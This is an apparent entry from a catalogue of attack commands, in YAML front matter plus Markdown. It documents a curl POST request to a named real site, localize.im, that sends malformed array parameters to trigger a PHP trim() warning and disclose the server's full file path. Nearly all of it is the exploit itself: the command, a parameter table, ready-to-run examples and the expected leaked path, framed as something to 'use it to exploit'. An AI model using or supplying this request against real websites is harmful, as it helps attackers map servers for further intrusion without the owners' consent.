---
id: cmd-curl-fpd-001
data: >-
  curl -X POST
  'https://www.localize.im/projects/[PROJECT_ID]/languages/[LANGUAGE_ID]' -H
  'Content-Type: application/x-www-form-urlencoded' -d
  'CSRFToken=[YOUR_CSRF_TOKEN]&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SECRET_CODES]&updatePhrases[translatorID]=[YOUR_ID]&updatePhrases[previous][testID][0][]='
tags:
  - web
  - post-request
  - fpd
type: command
output: >-
  HTTP response with PHP warning disclosing file path, e.g., "Warning: trim()
  expects parameter 1 to be string, array given in
  /srv/data/web/vhosts/www.localize.im/htdocs/index.php on line 191"
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.178Z'
verified: false
validated: true
submitted: true
---
# curl-post-malformed-array

## Command

```bash
curl -X POST 'https://www.localize.im/projects/[PROJECT_ID]/languages/[LANGUAGE_ID]' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CSRFToken=[YOUR_CSRF_TOKEN]&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SECRET_CODES]&updatePhrases[translatorID]=[YOUR_ID]&updatePhrases[previous][testID][0][]='
```

## Description

This curl command sends a crafted POST request to the Localize.im languages update endpoint with malformed array parameters to trigger a PHP trim() error, resulting in full path disclosure. Use it to exploit information disclosure vulnerabilities in PHP web apps by forcing array inputs to string-expecting functions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| URL (e.g., 'https://www.localize.im/projects/[PROJECT_ID]/languages/[LANGUAGE_ID]') | Target endpoint with placeholders for project and language IDs | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets the content type for form data | Yes |
| `-d '...'` | POST data including CSRF token and malformed parameters like updatePhrases[previous][testID][0][] | Yes |
| `[PROJECT_ID]`, `[LANGUAGE_ID]`, etc. | Replace with actual values from the application | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.localize.im/projects/123/languages/456' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CSRFToken=abc123&updatePhrases[previous][testID][0][]='
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://www.localize.im/projects/123/languages/456' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CSRFToken=abc123&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=secret123&updatePhrases[translatorID]=789&updatePhrases[previous][testID][0][]='
```

## Expected Output

A successful response includes a PHP warning in the body: "Warning: trim() expects parameter 1 to be string, array given in /srv/data/web/vhosts/www.localize.im/htdocs/index.php on line 191". If invalid token, expect 403 or no warning.

## Related

- [[Related Procedure: Trigger-PHP-Trim-Error-for-Full-Path-Disclosure]]
